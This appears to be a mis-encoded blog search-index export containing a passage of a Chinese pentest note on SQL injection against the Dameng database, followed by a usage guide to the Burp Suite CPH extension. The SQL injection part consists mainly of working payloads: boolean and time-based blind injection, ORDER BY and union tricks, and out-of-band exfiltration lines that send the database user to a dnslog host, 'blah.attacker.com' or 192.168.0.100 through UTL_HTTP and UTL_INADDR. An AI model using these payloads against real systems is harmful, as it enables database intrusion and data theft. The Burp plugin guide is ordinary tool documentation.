è‹¥expr1ä¸expr2ä¸åŒï¼Œåˆ™è¿”å›expr1ï¼Œå¦åˆ™è¿”å›NULL if(1=ascii(substr('123456',2,1)),2, 1) -- ç»¼åˆä½¿ç”¨ï¼Œç›²æ³¨å¿…å¤‡ CASE WHEN len(user)=6 THEN 1 ELSE 0 END DECODE(len(user),6,1,0) -- åˆ¤æ–­len(user)=6æ˜¯å¦æˆç«‹ï¼Œæˆç«‹è¿”å›1ï¼Œå¦åˆ™è¿”å›0 æ¡ˆä¾‹ï¼š SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=if(len(user)=6,1,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=(case when len(user)=4 then 1 else 0 end) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=decode(len(user),6 ,1,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=IFNULL(len(user)=6,0) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=NULLIF(len(user)=6,0) ORDER BY id DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:8:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x08 æ—¶é—´ç›²æ³¨ sleep(n) -- ä¼‘çœ nç§’ï¼Œä¸èƒ½å’Œselect ä¸€èµ·ç”¨ï¼Œè¯­æ³•é”™è¯¯ï¼Œå¤±å»ä»·å€¼ exec sleep 5 -- å»¶æ—¶5s dbms_pipe.receive_message(('a'),2) -- å¯ä»¥å»¶æ—¶ SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; -- å¦‚æœåæŸ¥å¾ˆæ…¢ï¼Œå¯èƒ½å¯ä»¥ SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; -- å¦‚æœæ­£æŸ¥å¾ˆæ…¢ SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; -- å¦‚æœå‘é€TCPåŒ…è¢«æ‹¦æˆªæˆ–è€…å¾ˆæ…¢ å®é™…è¿‡ç¨‹ä¸­æ—¶é—´ç›²æ³¨å¾ˆéš¾èµ·åˆ°ä½œç”¨ã€‚æµ‹è¯•å‘ç°ï¼Œç»“åˆå¸ƒå°”åˆ¤æ–­æ—¶ï¼Œæ— è®ºTrue/Falseï¼Œéƒ½ä¼šé€ æˆå»¶æ—¶ã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:9:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x09 DNSå¤–å¸¦æ³¨å…¥ éœ€è¦ç”¨æˆ·å¯è®¿é—®ç½‘ç»œçš„æƒé™ å¦‚æœæ•°æ®é•¿åº¦å¤ªé•¿ï¼Œå¦‚æ•°æ®åº“ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‡ºé”™ï¼Œè¿™æ—¶å€™è¦ä½¿ç”¨å¸¦å¤–ï¼Œå°±å¯ä»¥ä½¿ç”¨substr()å‡½æ•°æ¥æˆªå–å­—ç¬¦ä¸²ï¼Œæ¯æ¬¡å–å‡ ä¸ªç‰¹å®šçš„å­—ç¬¦å³å¯ å‘é€DNSè¯·æ±‚ï¼ŒDNSå¤–å¸¦ï¼š SELECT UTL_INADDR.get_host_address('google.com') FROM dual; -- priv SELECT UTL_INADDR.get_host_address((select user)||'.xxx.dnslog'); SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; SELECT UTL_HTTP.REQUEST('http://xxx.dnslog?'||(select user)) from dual; select utl_http.request('http://192.168.0.100:8888/?'||(select user)) from dual; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:10:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0A å †å æ³¨å…¥ åœ¨é¶åœºä¸­æ²¡æˆåŠŸï¼Œæç¤ºè¡¨ä¸å­˜åœ¨ï¼Œä½†æ˜¯åœ¨å®æˆ˜ä¸­æˆåŠŸè¿‡ã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"10.1 ç»“åˆDNSå¤–å¸¦ ç»“åˆDNSå¤–å¸¦æ³¨å…¥ï¼ŒæˆåŠŸè·å–åˆ°æ•°æ®ã€‚ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"10.2 ç»“åˆé™¤0æŠ¥é”™ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:11:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0B order by ä½ç½®æ³¨å…¥ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.1 ä½è¿ç®—ç¬¦ ä¸»è¦ä½¿ç”¨^äº¦æˆ–è¿ç®—ï¼Œå…¶ä»–ä¹Ÿå¯ ORDER BY id^(if(1=2,1,2) ORDER BY id^(if(len(user)=6,1,2)) SELECT * FROM t1 where rownum\u003c5 ORDER BY id^(if(1=2,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id^(if(len(user)=6,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id\u0026(if(len(user)=6,1,2)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id|(if(len(user)=6,1,2)) DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:1","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.2 union åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æ•´æ¡è¯­å¥åœ¨æ‹¬å·ä¸­ï¼Œä¸”å‰åå­—æ®µæ•°é‡ä¸€è‡´ (SELECT * FROM t1 where rownum\u003c5 ORDER BY id) union (select 1,2,user); (SELECT * FROM t1 where rownum\u003c5 ORDER BY id,null) union (select 1,2,user); ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:2","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"11.3 è½¬åŒ–æˆWhere å°†å…¶è½¬åŒ–ä¸º where åçš„æ³¨å…¥ç‚¹ SELECT * FROM xxxx WHERE is_delete != '1' ORDER BY id limit 0,20 SELECT * FROM xxxx WHERE is_delete != '1' ORDER BY (select 1 from dual where 1=1/(case when len(user)=6 then 1 else 0 end)) LIMIT 0,20 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:12:3","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x0C limit æ³¨å…¥ å¯ä»¥æ¥ å †å æ³¨å…¥ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:13:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"END å‚è€ƒæ–‡ç«  è¾¾æ¢¦æ•°æ®åº“æ‰‹å·¥æ³¨å…¥ç¬”è®°ï¼šhttps://mp.weixin.qq.com/s/vWt3aHhji7e64EMGEBXigg è¾¾æ¢¦æŠ€æœ¯æ–‡æ¡£ï¼šhttps://eco.dameng.com/document/dm/zh-cn/pm/logical-structure.html ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:14:0","tags":["SQLi"],"title":"è¾¾æ¢¦æ•°æ®åº“DMSQL-SQLæ³¨å…¥å°è®°","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Tools"],"content":"Burpæ’ä»¶ CPHï¼ˆCustom Parameter Handleï¼‰ä½¿ç”¨å¿ƒå¾—","date":"2024-11-13","objectID":"/posts/burp-cph-usage/","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"#tools/Burp/Burp-plug ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:0:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"ç®€ä»‹ CPHï¼šCustom Parameter Handler extension for Burp Suite. Burp Suite çš„è‡ªå®šä¹‰å‚æ•°å¤„ç†æ‰©å±•ï¼šä¸€æ¬¾ç”¨äºç²¾å‡†ä¿®æ”¹HTTPæ¶ˆæ¯çš„å·¥å…·ã€‚ CPH æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥ä¿®æ”¹ HTTP æ¶ˆæ¯çš„ä»»ä½•éƒ¨åˆ†ï¼Œå³ä½¿ä½¿ç”¨å®ä¹Ÿå¯ä»¥è¿›è¡Œç²¾ç¡®çš„æ“ä½œã€‚é€šå¸¸ï¼Œå®ä»…æ”¯æŒ HTTP å‚æ•°ï¼ˆname=valueï¼‰ï¼Œä½†ä½¿ç”¨æ­¤æ‰©å±•å¯ä»¥å®šä½ä»»ä½•å†…å®¹ã€‚ åŠŸèƒ½ï¼š æ ¹æ®èŒƒå›´å’Œæ¨¡å¼åŒ¹é…ï¼Œè‡ªåŠ¨ä¿®æ”¹è¯·æ±‚å’Œå“åº”ã€‚ æŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå®Œå…¨æ”¯æŒ RegExã€‚ èŒƒå›´é™å®šåˆ°ç‰¹å®šçš„ Burp Suite å·¥å…·ã€‚ æŒ‡å®šç‰¹å®šåŒ¹é…é¡¹ï¼ˆä»…ç¬¬ä¸€ä¸ªã€æ‰€æœ‰åŒ¹é…é¡¹æˆ–æ‰‹åŠ¨é€‰æ‹©ï¼‰ã€‚ æ”¯æŒä¿®æ”¹åŠ¨ä½œçš„è¿æ¥å’Œæ’åºï¼Œä»¥åŠæ ¹æ®å…ˆå‰çš„å“åº”è¿›è¡Œä¸‹ä¸€é¡¹ä¿®æ”¹çš„èƒ½åŠ›ã€‚ ä¿å­˜/åŠ è½½é…ç½®ï¼š å¿«é€Ÿä¿å­˜/å¿«é€ŸåŠ è½½ï¼ˆåœ¨ Burp/Extender ä¼šè¯ä¹‹é—´æŒç»­å­˜åœ¨ï¼‰ã€‚ ä» JSON æ–‡ä»¶å¯¼å…¥/å¯¼å‡ºã€‚ è¿è¡Œå®åï¼Œä»å…¶æœ€ç»ˆå“åº”ä¸­æå–æ›¿æ¢å€¼ã€‚ ä¿®æ”¹å®ä¸­çš„æ¯ä¸ªè¯·æ±‚/å“åº”ã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"CPH VS å®ï¼š CPHçš„ä¼˜åŠ¿ï¼š CPH å¯ä»¥å¤„ç† HTTP æ¶ˆæ¯çš„ä»»ä½•éƒ¨åˆ† å®åªèƒ½åŠ¨æ€æ´¾ç”Ÿæ ¼å¼ä¸ºname=valueçš„å‚æ•°ï¼›å³å®ƒä¸èƒ½å¯¹ JSONã€RESTfulï¼ˆå¦‚/user/123ï¼‰æˆ–ä»»ä½•å…¶ä»–åºåˆ—åŒ–ç­‰æ ¼å¼è¿›è¡Œæ“ä½œã€‚ CPH å¯ä»¥ä¿®æ”¹è¯·æ±‚å’Œ/æˆ–å“åº” å®åªèƒ½ä¿®æ”¹è¯·æ±‚ CPH å°†æ‰€æœ‰å¿…è¦çš„é…ç½®é›†ä¸­åˆ°äº†ä¸€èµ· å®éœ€è¦é¢å¤–é…ç½®ä¼šè¯å¤„ç†è§„åˆ™ï¼ˆsession handling rulesï¼‰ CPH å¯ä»¥æ£€æŸ¥ HTTP æ¶ˆæ¯çš„ä»»ä½•éƒ¨åˆ†ï¼Œä»¥ç¡®å®šå…¶æ˜¯å¦åº”åœ¨èŒƒå›´å†… å®ä¾èµ–äºè§¦å‘å®ƒä»¬çš„ä¼šè¯å¤„ç†è§„åˆ™ä¸­è®¾ç½®çš„èŒƒå›´ï¼Œå¹¶ä¸”æ­¤èŒƒå›´ä»…é™äºåè®®ã€ä¸»æœºã€ç«¯å£å’Œè·¯å¾„ CPHçš„éš¾ç‚¹ï¼š æ­£åˆ™è¡¨è¾¾å¼çš„ç¼–å†™ æ—¥å¿—ä¸å¤Ÿè¯¦ç»† ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:1","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"é—®é¢˜åœºæ™¯ è§£å†³CSRF Token è§£å†³éšæœºå­—ç¬¦ä¸² è§£å†³æµç¨‹åŒ–æ“ä½œ CSRF Tokenï¼š CSRF Token æ¯”è¾ƒå¥½ç†è§£ï¼Œæ¯æ¬¡è®¿é—®ç½‘é¡µï¼ŒæœåŠ¡å™¨ä¼šéšæœºè¿”å›ä¸€ä¸ªCSRF Tokenåœ¨å‰ç«¯ç•Œé¢ä¸­ï¼Œä¸‹ä¸€æ­¥è¯·æ±‚åŒ…ä¸­éœ€è¦ä½¿ç”¨è¯¥Tokenï¼Œè¯¥å·¥å…·å¯ä»¥è‡ªåŠ¨åŒ–æå–è¯¥Tokenå¹¶è¿›è¡Œæ›¿æ¢ï¼Œè®©æ¯æ¬¡å‘é€çš„CSRF Tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚ éšæœºå­—ç¬¦ä¸²ï¼š è¿™ç§æƒ…å†µä¸‹çš„å¯èƒ½çš„åœºæ™¯æœ‰ï¼š è¯·æ±‚æŸä¸ªæ¥å£ï¼ŒæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªéšæœº keyï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åŒ…éœ€è¦ä½¿ç”¨è¯¥keyæ‰èƒ½è®¿é—®ä¸‹ä¸€ä¸ªæ¥å£è·å–æ•°æ®ã€‚ ç™»å½•è¿‡ç¨‹æœ‰éªŒè¯ç å›æ˜¾ï¼Œè·å–éªŒè¯ç çš„å€¼ï¼Œå†è¿›è¡Œç™»å½• å…¶å®ä¸Šè¿°çš„å¸¸è§æœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ã€‚ æµç¨‹åŒ–æ“ä½œï¼š ç±»ä¼¼Burpè‡ªå¸¦çš„å®ï¼Œå®ä¸­å¯ä»¥è¿›è¡Œ key1=value2\u0026key2=value2 å½¢å¼çš„æ•°æ®æ›¿æ¢ï¼Œä½†ä¸æ”¯æŒJSONç­‰å…¶ä»–æ ¼å¼ï¼Œè¯¥å·¥å…·å¯ä»¥å®Œæˆç›¸åº”çš„åŠ¨ä½œã€‚ è¯¥å·¥å…·å¯ä»¥ä½œä¸ºå®çš„æ›¿ä»£æˆ–è¡¥å……ã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:1:2","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"UI ä»‹ç» æœ¬æ–‡çš„ä»‹ç»åŸºäºBurpSuite å•†åº— BApp Store ä¸­çš„ CPH V3.0a ç‰ˆæœ¬ã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"1ã€Optionsé¡µé¢ é¦–å…ˆï¼Œé¦–æ¬¡åŠ è½½æ—¶é»˜è®¤åªæœ‰ä¸€ä¸ªOptionsé¡µé¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å·¦ä¸Šè§’ä¾æ¬¡æ˜¯ï¼š verbosity levelï¼Œæ—¥å¿—è¾“å‡ºçš„è¯¦ç»†ç¨‹åº¦ï¼Œé»˜è®¤æ˜¯ 3 INFO çº§åˆ«ï¼Œè¾“å‡ºçš„å†…å®¹å¯åœ¨ Burp Extensionsä¸­æŸ¥çœ‹ Quicksave/Quickloadï¼šå¿«é€Ÿä¿å­˜/å¿«é€ŸåŠ è½½ï¼ˆåœ¨ Burp/Extender ä¼šè¯ä¹‹é—´æŒç»­å­˜åœ¨ï¼‰ Export Config / Import Configï¼šä» JSON æ–‡ä»¶å¯¼å…¥/å¯¼å‡ºCPHé€‰é¡¹å¡é…ç½®æ–‡ä»¶ Visit Wikiï¼š è®¿é—®Github Wiki Show EMVï¼šæ‰“å¼€ä¿®æ”¹æŸ¥çœ‹å™¨ (EMV)é¡µé¢ Running built-in httpd on 127.0.0.1:9001ï¼šå¯åŠ¨å†…ç½®çš„æµ‹è¯•ç”¨ä¾‹ å³ä¸Šè§’æ˜¯ Tool scop settingsï¼šç”¨äºæ§åˆ¶å·¥å…·ç”Ÿæ•ˆçš„èŒƒå›´ã€‚ ä¸‹æ–¹æ˜¯ ç‰ˆé¢æœ€å¤§Quickstart guideï¼Œè¿™å—å°±ä¸æäº†ã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:1","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"2ã€é€‰é¡¹å¡ ä»ä¸Šå¾€ä¸‹ä¾æ¬¡æ˜¯ï¼š \u003c \u003e ï¼šå·¦å³ç®­å¤´ï¼Œç”¨æ¥è°ƒæ•´å½“å‰é€‰é¡¹å¡çš„ä½ç½®ï¼Œå‰ç§»æˆ–åç§» Clone æŒ‰é’®ï¼šå…‹éš†å½“å‰é€‰é¡¹å¡åˆ°æ–°é€‰é¡¹å¡ Friendly Nameï¼š å½“å‰æ ‡ç­¾å¡åç§°ï¼Œå¯è‡ªå®šä¹‰ä¿®æ”¹ ç¬¬äºŒå—å†…å®¹æ˜¯èŒƒå›´ Scopingï¼š ç”¨äºæŒ‡å®šå½“å‰é€‰é¡¹å¡çš„ç”Ÿæ•ˆèŒƒå›´ï¼Œé¦–å…ˆéœ€è¦ç¡®ä¿ URL åœ¨Burpsuiteçš„èŒƒå›´ä¸­ã€‚ on all requests # å…¨éƒ¨è¯·æ±‚åŒ… on all responses # å…¨éƒ¨è¯·æ±‚åŒ… on all requests and responses # å…¨éƒ¨è¯·æ±‚åŒ…ä¸å“åº”åŒ… only on requests only on responses only on requests and responses è¿™ä¸‰ç§éœ€è¦é…ç½®æ­£åˆ™ï¼Œåªåœ¨æ»¡è¶³åŒ¹é…æ¡ä»¶çš„URLä¸Šæ‰§è¡Œå½“å‰é€‰é¡¹å¡ ç¬¬ä¸‰å—å†…å®¹æ˜¯å‚æ•°å¤„ç† Parameter handing Automatically URL-encode the first line of the request, if modifiedï¼ˆä¿®æ”¹åè‡ªåŠ¨å¯¹è¯·æ±‚çš„ç¬¬ä¸€è¡Œè¿›è¡Œ URL ç¼–ç ï¼‰ Change the destination of the requestã€‚æ›´æ”¹è¯·æ±‚åŒ…çš„å»å‘ï¼Œé‡å®šå‘åˆ°å¦ä¸€ä¸ªipæˆ–åŸŸå 1ï¼‰Find matches to this expressionï¼šï¼ˆæŸ¥æ‰¾ä¸æ­¤è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ï¼‰ 2ï¼‰Target the first/each/a subset of the matchesï¼šï¼ˆé€‰æ‹© ç¬¬ä¸€ä¸ª/æ¯ä¸ª/é›†åˆä¸­çš„ åŒ¹é…é¡¹ï¼‰subseté›†åˆè¯¦è§ å®šä½åŒ¹é… è¯´æ˜ã€‚ 3ï¼‰Replace each target with this expression: ï¼ˆç”¨ä»¥ä¸‹è¡¨è¾¾å¼æ›¿æ¢æ¯ä¸ªç›®æ ‡ï¼šï¼‰ å¯ç”¨â€œRegExâ€æ—¶ï¼Œå°†å¤„ç†è½¬ä¹‰åºåˆ—å’Œç»„å¼•ç”¨ã€‚åé¢è¾“å…¥æ¡†ä¸­å†™æ­£åˆ™è¡¨è¾¾å¼ã€‚ The value I need is dynamicï¼ˆæˆ‘éœ€è¦çš„å€¼æ˜¯åŠ¨æ€çš„ï¼‰ï¼Œå¦‚æœå‹¾é€‰è¿™ä¸€é¡¹ï¼Œå°†æ‰“å¼€4ï¼‰åŠŸèƒ½ 4ï¼‰In the expression above, refer to the named RegEx groups youâ€™ll define below in order to insert:ï¼ˆåœ¨ä¸Šé¢çš„è¡¨è¾¾å¼ä¸­ï¼Œè¯·å‚è€ƒä¸‹é¢å®šä¹‰çš„ RegEx å‘½åç»„ä»¥æ’å…¥ï¼šï¼‰ ä¸‹æ‹‰åˆ—è¡¨ä¸­æœ‰3ç§æ¨¡å¼ï¼š values returned by issuing a single requestï¼Œé€šè¿‡å‘å‡ºå•ä¸ªè¯·æ±‚è¿”å›çš„å€¼ values returned by issuing a sequence of requestsï¼Œé€šè¿‡å‘å‡ºä¸€ç³»åˆ—è¯·æ±‚è¿”å›çš„å€¼ values in the cached response of a previous CPH tabï¼Œå‰ä¸€ä¸ª CPH é€‰é¡¹å¡çš„ç¼“å­˜å“åº”ä¸­çš„å€¼ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:2:2","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"ç”¨æ³• å…·ä½“ç”¨æ³•å¯ä»¥å‚è€ƒ burp-cph-wiki ç»™äº†ç›¸åº”çš„æ•™ç¨‹ï¼ŒèŠ±ç‚¹æ—¶é—´å°±èƒ½å­¦ä¼šç†è§£å¹¶ä½¿ç”¨ï¼Œä½†æ˜¯è¿™æ¬¾å·¥å…·éœ€è¦å…·å¤‡æ­£åˆ™è¡¨è¾¾å¼çš„ç¼–å†™èƒ½åŠ›ã€‚ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:0","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"æ˜ç¡®èŒƒå›´ CPH åªä¼šé’ˆå¯¹ Burp Suite èŒƒå›´å†…çš„æ¶ˆæ¯ã€‚ âš ï¸å¦‚æœè¯·æ±‚/å“åº”ä¸åœ¨ Burp çš„èŒƒå›´å†…ï¼ŒCPH å°†å¿½ç•¥å®ƒâš ï¸ éœ€è¦å…ˆæŠŠç›®æ ‡ç½‘ç«™æ·»åŠ åˆ° Burp çš„ Targetåˆ—è¡¨ä¸­ã€‚ æˆ‘å¹³æ—¶ä¸€èˆ¬ä¸æ€ä¹ˆç”¨Targetè¿™é¡¹åŠŸèƒ½ï¼Œå› æ­¤è§‰å¾—æœ‰ç‚¹å¤šä½™ ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:1","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"æœ‰æ•ˆä¿®æ”¹æŸ¥çœ‹å™¨ (EMV) EMV æ˜¾ç¤ºæ¯ä¸ªé€‰é¡¹å¡å¯¹ HTTP æ¶ˆæ¯çš„æœ€ç»ˆä¿®æ”¹çš„å·®å¼‚ï¼Œå¹¶å¯ä»¥æœ‰æ•ˆå¸®åŠ©æ‚¨å¾®è°ƒ CPH é…ç½®ã€‚ â„¹ï¸è¯·æ³¨æ„ï¼ŒEMV é€‰é¡¹å¡å°†ä»…æ˜¾ç¤ºç”± CPH ä¸­ç›¸åº”é€‰é¡¹å¡ä¿®æ”¹çš„æ¶ˆæ¯ã€‚ ä¹Ÿå°±æ˜¯è¯´å¦‚æœé€šè¿‡Session handling rulesè°ƒç”¨çš„å…·ä½“ä¿®æ”¹æ˜¯çœ‹ä¸åˆ°çš„ã€‚ è€Œä¸”EMVæ„Ÿè§‰å¥½åƒæœ‰Bugï¼Œåªèƒ½æŸ¥çœ‹æœ€å¼€å§‹çš„ä¸€ä¸ªåŒ… ","date":"2024-11-13","objectID":"/posts/burp-cph-usage/:3:2","tags":["Tools"],"title":"Burp-CPHæ’ä»¶å¿ƒå¾—","uri":"/posts/burp-cph-usage/"},{"categories":["Tools"],"content":"1.å­—ç¬¦ä¸²æŸ¥æ‰¾æ›¿æ¢ CPH å…è®¸åœ¨è¯·æ±‚æˆ–å“åº”ä¸­æ‰¾åˆ°ç›®æ ‡å­—ç¬¦ä¸²ï¼Œç„¶åç”¨æ–°çš„æ‰€éœ€å€¼æ›¿æ¢ç›®æ ‡å­—ç¬¦ä¸²ã€‚ æ‚¨æƒ³è¦çš„å€¼å¯èƒ½æ¥æºäºï¼š æ­£åˆ™è¡¨è¾¾å¼ CPH å®æ—¶å‘å‡ºçš„è¯·æ±‚çš„å“åº” Burp å®çš„æœ€ç»ˆå“åº” ä¸Šä¸€ä¸ª CPH é€‰é¡¹å¡çš„ç¼“å­˜å“åº” æ–‡æœ¬åŒ¹é… 